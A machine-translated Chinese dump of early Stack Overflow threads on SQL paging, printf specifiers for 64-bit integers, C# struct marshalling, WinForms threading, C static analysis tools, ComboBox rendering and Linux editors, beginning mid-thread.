对此接受的答案实际上对我不起作用......我不得不再跳一圈才能让它工作。

当我尝试答案时

```
SELECT Row_Number() OVER(ORDER BY UserName) As RowID, UserFirstName, UserLastName
FROM Users
WHERE RowID Between 0 AND 9 
```

它失败了，抱怨它不知道 RowID 是什么。

我不得不将它包装在这样的内部选择中：

```
SELECT * 
FROM
    (SELECT
    Row_Number() OVER(ORDER BY UserName) As RowID, UserFirstName, UserLastName
    FROM Users
    ) innerSelect
WHERE RowID Between 0 AND 9 
```

然后它起作用了。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-09-16T16:17:24.913

当我需要进行分页时，我通常也会使用临时表。您可以使用输出参数来返回记录总数。select 中的 case 语句允许您对特定列上的数据进行排序，而无需求助于动态 SQL。

```
--Declaration--

--Variables
@StartIndex INT,
@PageSize INT,
@SortColumn VARCHAR(50),
@SortDirection CHAR(3),
@Results INT OUTPUT

--Statements--
SELECT @Results = COUNT(ID) FROM Customers
WHERE FirstName LIKE '%a%'

SET @StartIndex = @StartIndex - 1 --Either do this here or in code, but be consistent
CREATE TABLE #Page(ROW INT IDENTITY(1,1) NOT NULL, id INT, sorting_1 SQL_VARIANT, sorting_2 SQL_VARIANT)
INSERT INTO #Page(ID, sorting_1, sorting_2)
SELECT TOP (@StartIndex + @PageSize)
    ID,
    CASE
        WHEN @SortColumn='FirstName' AND @SortDirection='ASC' THEN CAST(FirstName AS SQL_VARIANT)
        WHEN @SortColumn='LastName' AND @SortDirection='ASC' THEN CAST(LastName AS SQL_VARIANT)
        ELSE NULL
    END AS sort_1,
    CASE
        WHEN @SortColumn='FirstName' AND @SortDirection='DES' THEN CAST(FirstName AS SQL_VARIANT)
        WHEN @SortColumn='LastName' AND @SortDirection='DES' THEN CAST(LastName AS SQL_VARIANT)
        ELSE NULL
    END AS sort_2
FROM (
    SELECT
        CustomerId AS ID,
        FirstName,
        LastName
    FROM Customers
    WHERE
        FirstName LIKE '%a%'
) C
ORDER BY sort_1 ASC, sort_2 DESC, ID ASC;

SELECT
    ID,
    Customers.FirstName,
    Customers.LastName
FROM #Page
INNER JOIN Customers ON
    ID = Customers.CustomerId
WHERE ROW > @StartIndex AND ROW <= (@StartIndex + @PageSize)
ORDER BY ROW ASC

DROP TABLE #Page 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-08-05T21:05:10.863

我相信你需要执行一个单独的查询来完成这一点。

使用此页面的一些帮助，我能够在以前的职位上完成此操作： [DotNet 2.0 中的分页](http://aspnet.4guysfromrolla.com/articles/031506-1.aspx)

他们也让它单独拉一个行数。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-08-13T14:16:13.813

这是我为分页所做的：我所有需要分页的大查询都被编码为插入到临时表中。临时表有一个身份字段，其行为方式与上面提到的 row_number() 类似。我将临时表中的行数存储在输出参数中，以便调用代码知道总共有多少条记录。调用代码还指定它想要哪个页面，以及每页有多少行，这些都是从临时表中选择出来的。

这样做的好处是我还有一个“导出”链接，它允许您从我的应用程序中每个网格上方以 CSV 格式返回的报告中获取所有行。此链接使用相同的存储过程：您只需返回临时表的内容，而不是执行分页逻辑。这安抚了讨厌分页，想要查看*所有内容*，并希望以百万种不同方式对其进行排序的用户。

# c - 如何使用 printf 格式化 unsigned long long int？

> ID：2844
> 
> 赞同：424
> 
> 时间：2008-08-05T20:59:29.330
> 
> 标签：c, syntax, printf, format-specifiers, long-long

```
#include <stdio.h>
int main() {
    unsigned long long int num = 285212672; //FYI: fits in 29 bits
    int normalInt = 5;
    printf("My number is %d bytes wide and its value is %ul. A normal number is %d.\n", sizeof(num), num, normalInt);
    return 0;
} 
```

输出：

```
My number is 8 bytes wide and its value is 285212672l. A normal number is 0. 
```

我认为这个意想不到的结果来自打印`unsigned long long int`. 你怎么`printf()`一个`unsigned long long int`？

* * *

## 回答 #1

> 赞同：549
> 
> 时间：2008-08-05T21:02:35.237

将 ll (el-el) long-long 修饰符与 u（无符号）转换一起使用。（适用于 Windows，GNU）。

```
printf("%llu", 285212672); 
```

* * *

## 回答 #2

> 赞同：109
> 
> 时间：2015-05-13T17:48:33.497

`%d`--> 为`int`

`%u`--> 为`unsigned int`

`%ld`--> 为`long int`或`long`

`%lu`--> for `unsigned long int`or `long unsigned int`or`unsigned long`

`%lld`--> 为`long long int`或`long long`

`%llu`--> 为`unsigned long long int`或`unsigned long long`

* * *

## 回答 #3

> 赞同：100
> 
> 时间：2008-08-12T11:07:50.060

您可能想尝试使用 inttypes.h 库，它为您提供诸如 、 等类型 `int32_t`。`int64_t`然后`uint64_t`您可以使用它的宏，例如：

```
uint64_t x;
uint32_t y;

printf("x: %"PRId64", y: %"PRId32"\n", x, y); 
```

`long`这是“保证”不会给您带来与,等相同的麻烦`unsigned long long`，因为您不必猜测每种数据类型中有多少位。

* * *

## 回答 #4

> 赞同：40
> 
> 时间：2009-09-06T14:26:41.233

对于使用 MSVS 的 long long（或 __int64），您应该使用 %I64d：

```
__int64 a;
time_t b;
...
fprintf(outFile,"%I64d,%I64d\n",a,b);    //I is capital i 
```

* * *

## 回答 #5

> 赞同：37
> 
> 时间：2008-09-09T07:54:37.927

那是因为 %llu 在 Windows 下不能正常工作，并且 %d 不能处理 64 位整数。我建议改用 PRIu64，你会发现它也可以移植到 Linux。

试试这个：

```
#include <stdio.h>
#include <inttypes.h>

int main() {
    unsigned long long int num = 285212672; //FYI: fits in 29 bits
    int normalInt = 5;
    /* NOTE: PRIu64 is a preprocessor macro and thus should go outside the quoted string. */
    printf("My number is %d bytes wide and its value is %" PRIu64 ". A normal number is %d.\n", sizeof(num), num, normalInt);
    return 0;
} 
```

输出

```
My number is 8 bytes wide and its value is 285212672\. A normal number is 5. 
```

* * *

## 回答 #6

> 赞同：16
> 
> 时间：2008-09-11T00:57:55.150

在 Linux 中是`%llu`，在 Windows 中是`%I64u`

虽然我发现它在 Windows 2000 中不起作用，但那里似乎有一个错误！

* * *

## 回答 #7

> 赞同：8
> 
> 时间：2012-10-11T06:23:13.393

使用 VS2005 将其编译为 x64：

> %llu 运行良好。

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2019-03-22T19:08:07.163

**显然，自 2008 年以来十多年来**，没有人提出多平台* 解决方案，所以我将附上我的 . 请点赞。（开玩笑。我不在乎。）

## 解决方案：`lltoa()`

如何使用：

```
#include <stdlib.h> /* lltoa() */
// ...
char dummy[255];
printf("Over 4 bytes: %s\n", lltoa(5555555555, dummy, 10));
printf("Another one: %s\n", lltoa(15555555555, dummy, 10)); 
```

OP的例子：

```
#include <stdio.h>
#include <stdlib.h> /* lltoa() */

int main() {
    unsigned long long int num = 285212672; // fits in 29 bits
    char dummy[255];
    int normalInt = 5;
    printf("My number is %d bytes wide and its value is %s. "
        "A normal number is %d.\n", 
        sizeof(num), lltoa(num, dummy, 10), normalInt);
    return 0;
} 
```

与`%lld`打印格式字符串不同，这个字符串适用于我**在 Windows 上的 32 位 GCC 下。**

*) 好吧，*几乎是*多平台的。在 MSVC 中，您显然需要[`_ui64toa()`](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/itoa-itow)代替[`lltoa()`](https://www.ibm.com/support/knowledgecenter/en/SSLTBW_2.3.0/com.ibm.zos.v2r3.bpxbd00/lltoa.htm).

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2016-01-17T12:27:29.953

除了人们多年前写的：

*   您可能会在 gcc/mingw 上收到此错误：

`main.c:30:3: warning: unknown conversion type character 'l' in format [-Wformat=]`

`printf("%llu\n", k);`

那么你的mingw版本不默认为c99。添加此编译器标志：`-std=c99`.

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2021-02-03T13:33:30.717

> 你如何格式化`unsigned long long int`using `printf`？

由于 C99 在转换说明符之前使用`"ll"`(ell-ell) `o,u,x,X`。

除了许多答案中的 base 10 选项外，还有 base 16 和 base 8 选项：

选择包括

```
unsigned long long num = 285212672;
printf("Base 10: %llu\n", num);
num += 0xFFF; // For more interesting hex/octal output.
printf("Base 16: %llX\n", num); // Use uppercase A-F
printf("Base 16: %llx\n", num); // Use lowercase a-f
printf("Base  8: %llo\n", num);
puts("or 0x,0X prefix");
printf("Base 16: %#llX %#llX\n", num, 0ull); // When non-zero, print leading 0X
printf("Base 16: %#llx %#llx\n", num, 0ull); // When non-zero, print leading 0x
printf("Base 16: 0x%llX\n", num); // My hex fave: lower case prefix, with A-F 
```

输出

```
Base 10: 285212672
Base 16: 11000FFF
Base 16: 11000fff
Base  8: 2100007777
or 0x,0X prefix
Base 16: 0X11000FFF 0
Base 16: 0x11000fff 0
Base 16: 0x11000FFF 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-08-05T21:03:07.810

非标准的东西总是很奇怪:)

对于 GNU 下的 long long 部分，它是`L`,`ll`或`q`

在窗户下，我相信它`ll`只是

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-08-05T21:40:24.757

好吧，一种方法是使用 VS2008 将其编译为 x64

这将按您的预期运行：

```
int normalInt = 5; 
unsigned long long int num=285212672;
printf(
    "My number is %d bytes wide and its value is %ul. 
    A normal number is %d \n", 
    sizeof(num), 
    num, 
    normalInt); 
```

对于 32 位代码，我们需要使用正确的 __int64 格式说明符 %I64u。于是就变成了。

```
int normalInt = 5; 
unsigned __int64 num=285212672;
printf(
    "My number is %d bytes wide and its value is %I64u. 
    A normal number is %d", 
    sizeof(num),
    num, normalInt); 
```

此代码适用于 32 位和 64 位 VS 编译器。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2015-07-26T09:57:06.023

十六进制：

```
printf("64bit: %llp", 0xffffffffffffffff); 
```

输出：

```
64bit: FFFFFFFFFFFFFFFF 
```

# c# - 从字节数组中读取 C# 中的 C/C++ 数据结构

> ID：2871
> 
> 赞同：91
> 
> 时间：2008-08-05T21:19:03.147
> 
> 标签：c#, .net, data-structures, marshalling

从数据来自 C/C++ 结构的 byte[] 数组填充 C# 结构的最佳方法是什么？C 结构看起来像这样（我的 C 非常生锈）：

```
typedef OldStuff {
    CHAR Name[8];
    UInt32 User;
    CHAR Location[8];
    UInt32 TimeStamp;
    UInt32 Sequence;
    CHAR Tracking[16];
    CHAR Filler[12];
} 
```

并会填充这样的内容：

```
[StructLayout(LayoutKind.Explicit, Size = 56, Pack = 1)]
public struct NewStuff
{
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
    [FieldOffset(0)]
    public string Name;

    [MarshalAs(UnmanagedType.U4)]
    [FieldOffset(8)]
    public uint User;

    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
    [FieldOffset(12)]
    public string Location;

    [MarshalAs(UnmanagedType.U4)]
    [FieldOffset(20)]
    public uint TimeStamp;

    [MarshalAs(UnmanagedType.U4)]
    [FieldOffset(24)]
    public uint Sequence;

    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 16)]
    [FieldOffset(28)]
    public string Tracking;
} 
```

如果作为 byte[] 数组传递，则复制`OldStuff`到的最佳方法是什么？`NewStuff``OldStuff`

我目前正在做类似以下的事情，但感觉有点笨拙。

```
GCHandle handle;
NewStuff MyStuff;

int BufferSize = Marshal.SizeOf(typeof(NewStuff));
byte[] buff = new byte[BufferSize];

Array.Copy(SomeByteArray, 0, buff, 0, BufferSize);

handle = GCHandle.Alloc(buff, GCHandleType.Pinned);

MyStuff = (NewStuff)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(NewStuff));

handle.Free(); 
```

有没有更好的方法来做到这一点？

* * *

使用`BinaryReader`该类是否会比固定内存和使用提供任何性能提升`Marshal.PtrStructure`？

* * *

## 回答 #1

> 赞同：122
> 
> 时间：2008-08-05T21:29:39.647

从我在这种情况下可以看到，您不需要复制`SomeByteArray`到缓冲区中。您只需要从 获取句柄`SomeByteArray`，将其固定，使用复制`IntPtr`数据`PtrToStructure`然后释放。不需要副本。

那将是：

```
NewStuff ByteArrayToNewStuff(byte[] bytes)
{
    GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
    try
    {
        NewStuff stuff = (NewStuff)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(NewStuff));
    }
    finally
    {
        handle.Free();
    }
    return stuff;
} 
```

通用版本：

```
T ByteArrayToStructure<T>(byte[] bytes) where T: struct 
{
    T stuff;
    GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
    try
    {
        stuff = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
    }
    finally
    {
        handle.Free();
    }
    return stuff;
} 
```

更简单的版本（需要`unsafe`开关）：

```
unsafe T ByteArrayToStructure<T>(byte[] bytes) where T : struct
{
    fixed (byte* ptr = &bytes[0])
    {
        return (T)Marshal.PtrToStructure((IntPtr)ptr, typeof(T));
    }
} 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2017-01-24T18:40:34.290

[这是已接受答案](https://stackoverflow.com/a/2887/184528)的异常安全版本：

```
public static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
{
    var handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
    try {
        return (T) Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
    }
    finally {
        handle.Free();
    }
} 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-08-31T10:03:39.317

注意包装问题。在您给出的示例中，所有字段都处于明显的偏移量，因为所有内容都在 4 字节边界上，但情况并非总是如此。默认情况下，Visual C++ 打包在 8 字节边界上。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2011-12-11T11:46:12.117

```
object ByteArrayToStructure(byte[] bytearray, object structureObj, int position)
{
    int length = Marshal.SizeOf(structureObj);
    IntPtr ptr = Marshal.AllocHGlobal(length);
    Marshal.Copy(bytearray, 0, ptr, length);
    structureObj = Marshal.PtrToStructure(Marshal.UnsafeAddrOfPinnedArrayElement(bytearray, position), structureObj.GetType());
    Marshal.FreeHGlobal(ptr);
    return structureObj;
} 
```

拥有这个

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2008-08-05T21:24:27.283

如果您有一个 byte[]，您应该能够使用 BinaryReader 类并使用可用的 ReadX 方法在 NewStuff 上设置值。

# c# - 可以“分拆”几个 GUI 线程吗？（不会在 Application.Run 中停止系统）

> ID：2872
> 
> 赞同：26
> 
> 时间：2008-08-05T21:19:37.280
> 
> 标签：c#, .net, winforms

**我的目标**

我想要一个主处理线程（非 GUI），并且能够根据需要在自己的后台线程中分离 GUI，并让我的主非 GUI 线程继续工作。换句话说，我希望我的主要非 GUI 线程成为 GUI 线程的所有者，反之亦然。我不确定这甚至可以使用 Windows 窗体（？）

**背景**

我有一个基于组件的系统，其中控制器动态加载程序集并实例化和运行实现`IComponent`具有单个方法的通用接口的类`DoStuff()`。

加载哪些组件是通过 xml 配置文件和添加包含不同实现的新程序集来配置的`IComponent`。组件向主应用程序提供实用功能。虽然主程序正在做它的事情，例如控制核电站，但组件可能正在执行实用任务（在它们自己的线程中），例如清理数据库，发送电子邮件，在打印机上打印有趣的笑话，你有什么。我想要的是让这些组件中的一个能够显示 GUI，例如带有所述电子邮件发送组件的状态信息。

整个系统的生命周期是这样的

1.  应用程序启动。
2.  检查配置文件以加载要加载的组件。加载它们。
3.  **对于每个组件，运行`DoStuff()`以对其进行初始化，并使其在自己的线程中过上自己的生活。**
4.  继续做主要的应用程序，永远的工作之王。

如果组件在`DoStuff()`. 它只是停止，直到 GUI 关闭。直到关闭 GUI，程序才会进入第 4 点。

如果允许这些组件启动它们自己的 Windows 窗体 GUI，那就太好了。

**问题**

当组件尝试在其中启动 GUI 时`DoStuff()`（确切的代码行是组件运行时`Application.Run(theForm)`），组件以及因此我们的系统在该行“挂起”，`Application.Run()`直到 GUI 关闭。好吧，正如预期的那样，刚刚启动的 GUI 工作正常。

组件示例。一个与 GUI 无关，而第二个打开一个可爱的窗口，里面有粉红色的毛茸茸的兔子。

```
public class MyComponent1: IComponent
{
    public string DoStuff(...) { // write something to the database  }
}

public class MyComponent2: IComponent
{
    public void DoStuff()
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.Run(new Form());

        // I want the thread to immediately return after the GUI 
        // is fired up, so that my main thread can continue to work.
    }
} 
```

我试过这个没有运气。即使我尝试在它自己的线程中启动 GUI，执行也会停止，直到 GUI 关闭。

```
public void DoStuff()
{
    new Thread(ThreadedInitialize).Start()
}

private void ThreadedInitialize()
{
    Application.EnableVisualStyles();
    Application.SetCompatibleTextRenderingDefault(false);
    Application.Run(new Form());
} 
```

是否可以分拆 GUI 并在之后返回`Application.Run()`？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-08-05T21:45:17.663

**Application.Run**方法显示一个（或多个）表单并启动标准消息循环，该循环一直运行直到所有表单关闭。除了关闭所有表单或强制关闭应用程序外，您不能强制从该方法返回。

但是，您可以将**ApplicationContext**（代替新的 Form()）传递给 Application.Run 方法，并且 ApplicationContext 可用于一次启动多个表单。只有当所有这些都关闭时，您的申请才会结束。见这里：http: [//msdn.microsoft.com/en-us/library/system.windows.forms.application.run.aspx](http://msdn.microsoft.com/en-us/library/system.windows.forms.application.run.aspx)

此外，您以非模态方式显示的任何表单都将继续与您的主表单一起运行，这将使您能够拥有多个不会相互阻塞的窗口。我相信这实际上是你想要完成的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-08-05T23:22:00.743

我敢肯定，如果您足够努力地破解它，这是可能的，但我认为这不是一个好主意。

“Windows”（您在屏幕上看到的）与进程高度耦合。也就是说，显示任何 GUI 的每个进程都应该有一个消息循环，它处理与创建和管理窗口有关的所有消息（例如“单击按钮”、“关闭应用程序”、“重绘屏幕' 等等。

因此，或多或少假设如果您有任何消息循环，它必须在您的进程的生命周期内可用。例如，windows 可能会向您发送一条“退出”消息，并且您需要有一个消息循环来处理它，即使您在屏幕上什么也没有。

你最好的选择是这样做：

制作一个从未显示的假表格，它是您的“主应用程序”启动呼叫 Application.Run 并传入这个假表格。在另一个线程中做你的工作，当你需要做 Gui 的东西时在主线程上触发事件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-23T21:57:11.120

我不确定这是否正确，但是我记得通过新建表单并在其上调用 newForm.Show() 来从控制台应用程序运行窗口表单，如果您的组件使用它而不是 Application.Run() 那么新的表格不应该阻塞。

当然，组件将负责维护对其创建的表单的引用

# c - 选择静态代码分析工具

> ID：2873
> 
> 赞同：69
> 
> 时间：2008-08-05T21:19:40.913
> 
> 标签：c, unix, testing

我正在从事一个项目，我在 UNIX 环境中使用 C 进行编码。我一直在使用 lint 工具检查我的源代码。Lint 已经存在了很长时间（自 1979 年以来），任何人都可以建议我可以使用的更新的代码分析工具吗？最好是免费的工具。

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2008-08-05T22:17:24.777

不要忽视编译器本身。阅读编译器的文档并找到它可以提供的所有警告和错误，然后尽可能多地启用对您有意义的。

还要确保告诉您的编译器将警告视为错误，以便您被迫立即修复它们（`-Werror`在 gcc 上）。顺便说一句，不要被`-Wall`gcc所愚弄并*不会*启用所有警告。

你可能想检查一下[`valgrind`](http://valgrind.org)（免费！）——它“自动检测[s]许多内存管理和线程错误，并详细分析你的程序。” 它不是静态检查器，但它是一个很棒的工具！

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2008-08-05T21:42:22.427

对于 C 代码，您绝对应该使用[Flexelint](http://www.gimpel.com/html/lintinfo.htm)。我用了将近 15 年，并且发誓。它具有的真正出色的功能之一是可以通过代码中的注释（“/* lint -e123*/”）有选择地关闭和打开警告。当您想要一些与众不同的东西时，这被证明是一个强大的文档工具。“我正在关闭警告 X，因此，我这样做是有充分理由的。”

对于任何遇到有趣的 C/C++ 问题的人，请查看他们网站上的一些示例，看看您是否可以在不查看提示的情况下找出错误。

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2008-08-06T00:40:03.597

我听说过关于[clang static analyzer](http://clang-analyzer.llvm.org/)的好消息，IIRC 使用 LLVM 作为后端。如果这在您的平台上实现，那可能是一个不错的选择。

据我了解，它不仅仅是语法分析。例如，“自动查找错误”。

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2015-06-25T15:54:11.460

您可以使用[cppcheck](http://cppcheck.sourceforge.net)。它是一个易于使用的静态代码分析工具。
例如：
`cppcheck --enable=all .`
将检查当前文件夹下的所有 C/C++ 文件。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2008-09-03T22:11:19.013

我最近编制了一份我可以使用的所有静态分析工具的列表，我仍在评估它们。请注意，这些主要是安全分析工具。

*   [夹板](http://www.splint.org/)
*   [大鼠](http://www.fortify.com/security-resources/rats.jsp)
*   [匹配](http://smatch.sourceforge.net/)
*   [宇野](http://www.spinroot.com/uno/)

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2008-08-15T17:47:21.813

我们一直在使用[Coverity Prevent](http://www.coverity.com/)来检查 C++ 源代码。

它不是一个免费工具（尽管我相信他们为开源项目提供免费扫描），但它是您能找到的最好的静态分析工具之一。我听说它在 C 上比在 C++ 上更令人印象深刻，但到目前为止它帮助我们避免了相当多的错误。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-08-23T14:29:04.923

类似 Lint 的工具通常会遇到“误报”问题：它们报告的问题比实际存在的要多得多。如果真正有用的警告比例太低，用户就会学会忽略该工具。更现代的工具会花费一些精力来关注最可能/最有趣的警告。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-08-15T22:39:41.380

您可能会发现[Uno 工具](http://spinroot.com/uno/)很有用。这是为数不多的免费非玩具选项之一。它与 lint、Flexelint 等的不同之处在于专注于少数“语义”错误（空指针 derefs、越界数组索引和使用未初始化的变量）。它还允许用户定义检查，例如锁定-解锁规则。

我正在努力公开发布后续工具~~[Orion](http://cm.bell-labs.com/cm/cs/what/orion/)~~ （**内容不再可用**）

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-12-19T23:29:54.063

[PC-lint/Flexelint](http://www.gimpel.com/html/products.htm)是非常强大和有用的静态分析工具，并且高度可配置，但遗憾的是不是免费的。

当第一次使用这样的工具时，他们会产生大量的警告，这使得很难区分主要和次要的警告。因此，最好在项目的早期就开始在您的代码上使用该工具，然后尽可能频繁地在您的代码上运行它，这样您就可以在出现新警告时进行处理。

通过像这样的持续使用，您很快就会学习如何以符合该工具应用的规则的方式编写代码。

正因为如此，我更喜欢像 Lint 这样运行相对较快的工具，因此鼓励持续使用，而不是更繁琐的工具，你可能最终会很少使用，如果有的话。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2015-06-26T12:01:12.940

您可以尝试[CppDepend](http://www.cppdepend.com)，这是一个非常完整的静态分析器，可用于 windows 和 linux，通过 VS 插件、IDE 或命令行，它对[开源贡献者是免费的](http://www.cppdepend.com/CppDependForOSS)

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-08-23T11:42:30.360

**lint**会不断更新……那你为什么想要一个更新的。

BTW flexelint**是**lint

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-08-26T15:21:28.297

天，

我完全同意在设置 -Wall 后阅读和消化编译器告诉你的内容的建议。

一个很好的安全静态分析工具是David Wheeler 编写的[FlawFinder 。](http://www.dwheeler.com/flawfinder/)它在寻找各种安全漏洞方面做得很好，

但是，它并不能取代让知识渊博的人阅读您的代码。正如大卫在他的网页上所说，“有工具的傻瓜仍然是傻瓜！”

干杯，

抢

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2011-06-15T06:53:42.250

我发现通常最好使用多个静态分析工具来查找错误。每个工具的设计都不同，它们可以找到彼此非常不同的东西。

[在这里](http://samate.nist.gov/SATE2010Workshop.html)的一些谈话中有一些很好的讨论。它来自美国国土安全部举行的关于静态分析的会议。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2012-12-20T07:36:49.027

[Sparse](http://en.wikipedia.org/wiki/Sparse)是一种计算机软件工具，已经在 Linux 上可用，旨在发现 Linux 内核中可能存在的编码错误。

[Linux 验证中心](http://linuxtesting.org/kernel)有两个活跃的项目旨在提高可加载内核模块的质量。

1.  Linux 驱动程序验证 (LDV) - 用于对 Linux 设备驱动程序进行静态源代码验证的综合工具集。
2.  KEDR Framework - 用于动态分析和验证内核模块的可扩展框架。
3.  另一个正在进行的项目是 Linux 文件系统验证，旨在开发用于验证 Linux 文件系统实现的专用工具集。

* * *

## 回答 #15

> 赞同：-1
> 
> 时间：2008-08-15T22:03:12.063

gcc 有一个“-Weffc++”选项，根据 Mac OS X 手册页，该选项将：

> 警告违反 Scott Meyers 的 Effective C++ 书中的以下样式指南：

***[剪辑]***

我知道你问过 C，但这是我所知道的最接近的..

# c# - 如何使控件看起来像启用了 Visual Styles 的 ComboBox？

> ID：2874
> 
> 赞同：35
> 
> 时间：2008-08-05T21:19:57.170
> 
> 标签：c#, .net, winforms

我有一个以**ComboBox**为模型的控件。我想渲染控件，使控件**边框**看起来像标准的**Windows ComboBox**。具体来说，我遵循了 MSDN 文档，并且控件的所有呈现都是正确的，除了在禁用控件时呈现。

需要明确的是，这适用于启用了**视觉样式**的系统。**此外，控件的所有部分都正确呈现，但禁用控件周围的边框与禁用的ComboBox 边框**颜色不匹配。

我正在使用**VisualStyleRenderer**类。MSDN 建议使用**ComboBox控件的****TextBox**部分的`VisualStyleElement.TextBox`元素，但标准禁用**TextBox**和标准禁用**ComboBox**的绘制略有不同（一个具有浅灰色边框，另一个具有浅蓝色边框）。

 ******如何在禁用状态下正确呈现控件？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2008-08-16T21:28:33.287

我不能 100% 确定这是否是您要查找的内容，但您应该查看 System.Windows.Forms.VisualStyles 命名空间中的**VisualStyleRenderer**。

1.  [VisualStyleRenderer 类](http://msdn.microsoft.com/en-us/library/system.windows.forms.visualstyles.visualstylerenderer.aspx)(MSDN)
2.  [如何：渲染视觉样式元素](http://msdn.microsoft.com/en-us/library/ms171735.aspx)(MSDN)
3.  [VisualStyleElement.ComboBox.DropDownButton.Disabled](http://msdn.microsoft.com/en-us/library/system.windows.forms.visualstyles.visualstyleelement.combobox.dropdownbutton.disabled.aspx) (MSDN)

由于如果用户没有启用视觉样式（他/她可能正在运行“经典模式”或 Windows XP 之前的操作系统），VisualStyleRenderer 将无法工作，因此您应该始终回退到 ControlPaint 类。

```
// Create the renderer.
if (VisualStyleInformation.IsSupportedByOS 
    && VisualStyleInformation.IsEnabledByUser) 
{
    renderer = new VisualStyleRenderer(
        VisualStyleElement.ComboBox.DropDownButton.Disabled);
} 
```

然后在绘图时这样做：

```
if(renderer != null)
{
    // Use visual style renderer.
}
else
{
    // Use ControlPaint renderer.
} 
```

希望能帮助到你！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-08-16T19:58:44.013

是否有任何[ControlPaint](http://msdn.microsoft.com/en-us/library/system.windows.forms.controlpaint_members.aspx)方法对此有用？这就是我通常用于自定义呈现控件的内容。******

# linux - Linux 的文本编辑器（除了 Vi）？

> ID：2898
> 
> 赞同：51
> 
> 时间：2008-08-05T21:42:37.763
> 
> 标签：linux, editor

让我先说我在 Mac OSX 上使用 TextMate 来满足我的文本需求，我爱上了它。Linux 平台上有什么可比的吗？我将主要使用它来编码 python/ruby。

进行谷歌搜索会产生过时的答案。

编辑：由于有人担心这个问题的“优点”。我即将在 Linux 中开始一个新的 Ruby 编程项目，在开始之前，我想确保我有合适的工具来完成这项工作。

编辑#2：我每天都使用 VIM——所有 . 这 。时间。我喜欢使用它。我只是在寻找一些替代品。

* * *

## 回答 #1

> 赞同：134
> 
> 时间：2008-08-27T14:21:43.050

![真正的程序员在开始时就设置了通用常数，这样宇宙就会进化到包含他们想要的数据的磁盘。](../Images/ebac07041a265cfed599077887905c5c.png)

[http://xkcd.com/378/](http://xkcd.com/378/)

* * *

## 回答 #2

> 赞同：43
> 
> 时间：2008-08-05T21:49:12.180

Emacs 是一个很棒的文本编辑器。一旦你成为超级用户，它就会拥有巨大的力量。您可以访问一个 shell，在尽可能多的子窗口中打开任意数量的文件，以及一个极其强大的脚本支持，让您可以添加各种简洁的功能。

我一直在使用 ruby​​ 模式，它为 ruby​​ 添加了语法高亮和诸如此类的东西，每种主要语言都存在同样的情况。

如果你坚持下去，你可以只使用键盘而不用触摸鼠标，这大大提高了你的编辑速度。

如果你想从更基本的东西开始，gedit 很不错......它还内置了语法突出显示以及基于文件扩展名的大多数语言。它也随操作系统一起提供（尽管您可以使用 apt-get 或一些类似的包查找实用程序轻松安装 emacs）。

更新：我认为 gedit 是完全基于 GUI 的，所以学习 emacs 会很有用，以防你只使用一个 shell（它在 shell 和图形模式下都具有完整的功能）。

进一步更新：仅供参考，我并不是想将 Emacs 推向 Vim，这正是我使用的，它是一个很棒的编辑器（我相信 Vim 也是如此）。一开始是令人生畏的（我相信 Vim 也是如此），但问题是关于 Linux 上除 vi 之外的文本编辑器... Emacs 对我来说似乎是合乎逻辑的选择，但 gedit 是一个很棒的简单文本编辑器，具有一些不错的功能如果这就是你要找的全部。

* * *

## 回答 #3

> 赞同：25
> 
> 时间：2008-08-06T09:26:16.377

Kate，KDE 高级文本编辑器相当不错。它具有语法高亮、块选择模式、终端/控制台、会话、水平和垂直窗口分割等。

* * *

## 回答 #4

> 赞同：18
> 
> 时间：2012-04-18T06:06:30.690

我在 linux 上使用[sublime Text 。](http://www.sublimetext.com/)

* * *

## 回答 #5

> 赞同：17
> 
> 时间：2008-09-16T13:44:19.540

试试[抄写员](http://scribes.sourceforge.net/)。它试图成为 Linux 的 TextMate 替代品

2020年编辑：被遗忘在历史的迷雾中

* * *

## 回答 #6

> 赞同：10
> 
> 时间：2008-08-06T09:12:03.643

我使用[SciTE](http://www.scintilla.org/SciTE.html) 非常小巧简单的文本编辑器。

* * *

## 回答 #7

> 赞同：9
> 
